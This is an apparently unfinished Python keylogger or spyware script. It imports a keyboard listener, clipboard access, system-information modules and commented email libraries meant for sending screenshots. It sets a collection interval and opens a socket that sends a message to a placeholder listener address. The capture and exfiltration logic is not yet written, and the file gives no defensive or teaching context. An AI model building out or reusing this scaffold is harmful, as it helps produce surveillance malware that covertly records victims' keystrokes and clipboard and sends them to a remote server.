# =========================================== Libraries ==============================================

# If needed for bigger code
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from email.mime.base import MIMEBase
# from email import encoders
# import smtplib
# The libraries mentioned above are used to create and send an email containing the screenshots.

import socket  # Allows Python programs to communicate over networks
import platform  # provides information about the underlying platform on which the code is running

import win32clipboard

from pynput.keyboard import (
    Key,
    Listener,
)  # used to control and monitor input devices such as the keyboard and mouse test

import time  # used for tasks like pausing code execution, measuring the time taken by code to run
import os  # provides a way to interact with the operating system and perform various system-level tasks

import getpass  # used to securely handle password input
from requests import get  # used to send an HTTP GET request to s specified URL

from multiprocessing import (
    process,
    freeze_support,
)  # allows the creation of parallel processes (speed up)

# from PIL import ImageGrab

# =========================================== Hard code ==============================================

# server information
ip_address = ""
port_number = "8080"
# interal in seconds for the code's execution
time_interval = 10


# =========================================== Base code ==============================================

import socket

HOST = "<listener_ip>"  # The server's hostname or IP address
PORT = 12345  # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(b"Hello, server!")
